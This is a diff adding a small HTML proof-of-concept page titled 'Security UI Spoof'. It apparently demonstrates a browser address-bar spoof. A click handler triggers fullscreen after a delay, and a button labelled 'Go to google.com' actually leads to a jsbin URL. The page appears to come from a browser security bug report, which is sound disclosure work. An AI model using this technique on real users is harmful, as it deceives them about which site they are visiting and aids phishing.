@@ -1,0 +1,34 @@
+
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <title>Security UI Spoof</title>
+        <style>
+            body {
+                margin: 0;
+                padding: 0;
+            }         
+            #spoof {
+                width:  100%;
+                height: 100%;
+            }
+        </style>
+        <script>
+            onclick = async () => {
+             
+                setTimeout(function(){
+                document.documentElement.requestFullscreen();}, 1500);
+            }
+        </script>
+    </head>  
+    <body>
+        <div id="content">
+            <br><br><br>
+            <center>
+                <h1>Click anywhere on the page to spoof the omnibox!</h1>
+            </center>
+			<input onclick="document.location='https://output.jsbin.com/bekupoqehe/1/'" type="button" value="Go to google.com">
+        </div>
+    </body>
+  </body>
+</html>
